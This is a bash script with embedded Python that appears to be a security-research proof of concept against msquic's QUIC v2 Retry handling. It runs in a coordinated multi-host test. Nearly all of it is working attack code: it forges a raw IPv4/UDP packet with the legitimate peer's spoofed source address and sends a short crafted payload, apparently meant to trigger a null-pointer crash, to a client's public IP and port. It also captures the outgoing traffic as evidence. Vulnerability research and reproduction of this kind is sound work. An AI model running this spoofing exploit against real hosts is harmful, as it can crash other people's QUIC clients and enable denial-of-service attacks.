#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-public-peer-results/attacker-macos"
mkdir -p "$RESULTS"
python3 "$ROOT/nettest-coord.py" wait "peer-mapping.json" "$RESULTS/mapping.json" 900

ATTACKER_PUBLIC_IP="$(curl -4 -fsS https://api.ipify.org)"
PEER_IP="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["peer_ip"])
PY
)"
CLIENT_PUBLIC_IP="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["client_public_ip"])
PY
)"
CLIENT_PUBLIC_PORT="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["client_public_port"])
PY
)"
PEER_PORT="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["peer_port"])
PY
)"
printf 'ATTACKER_PUBLIC_IP=%s\nPEER_IP=%s\nCLIENT_PUBLIC_IP=%s\nCLIENT_PUBLIC_PORT=%s\nPEER_PORT=%s\n' \
  "$ATTACKER_PUBLIC_IP" "$PEER_IP" "$CLIENT_PUBLIC_IP" "$CLIENT_PUBLIC_PORT" "$PEER_PORT" | tee "$RESULTS/network-identities.txt"
if [ "$ATTACKER_PUBLIC_IP" = "$CLIENT_PUBLIC_IP" ] || [ "$ATTACKER_PUBLIC_IP" = "$PEER_IP" ]; then
  echo "FAIL: attacker and target/peer are not distinct public IP endpoints"
  exit 1
fi

IFACE="$(route -n get default | awk '/interface:/{print $2; exit}')"
if command -v tcpdump >/dev/null 2>&1 && [ -n "$IFACE" ]; then
  sudo tcpdump -U -ni "$IFACE" "udp and dst host $CLIENT_PUBLIC_IP and dst port $CLIENT_PUBLIC_PORT" \
    -w "$RESULTS/attacker-egress.pcap" >/dev/null 2>&1 &
  CAP_PID=$!
else
  CAP_PID=""
fi
cleanup(){ set +e; if [ -n "$CAP_PID" ]; then sudo kill "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; fi; }
trap cleanup EXIT
sleep 1

sudo python3 - "$RESULTS/mapping.json" <<'PY' | tee "$RESULTS/attacker.log"
import ipaddress,json,socket,struct,sys
m=json.load(open(sys.argv[1]))
src=ipaddress.IPv4Address(m["peer_ip"]).packed
dst=ipaddress.IPv4Address(m["client_public_ip"]).packed
sport=int(m["peer_port"]); dport=int(m["client_public_port"])
payload=bytes.fromhex("806b3343cf0000")
udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
header=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(udp),0x5a72,0,64,17,0,src,dst)
def checksum(data):
    if len(data)&1: data += bytes([0])
    words=struct.unpack("!%dH"%(len(data)//2),data)
    total=sum(words)
    while total>>16: total=(total&0xffff)+(total>>16)
    return (~total)&0xffff
header=header[:10]+struct.pack("!H",checksum(header))+header[12:]
packet=header+udp
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
sent=s.sendto(packet,(m["client_public_ip"],0))
if sent != len(packet): raise SystemExit(f"short raw send: {sent}/{len(packet)}")
print(f"SPOOF_SENT os=macos count=1 bytes={sent} src={m['peer_ip']}:{sport} dst={m['client_public_ip']}:{dport} payload={payload.hex()}")
PY
sleep 2
cleanup
trap - EXIT
if [ -f "$RESULTS/attacker-egress.pcap" ]; then
  tcpdump -nn -r "$RESULTS/attacker-egress.pcap" -c 5 >"$RESULTS/attacker-egress.txt" 2>&1 || true
fi
cat "$RESULTS/attacker.log"
[ ! -f "$RESULTS/attacker-egress.txt" ] || cat "$RESULTS/attacker-egress.txt"
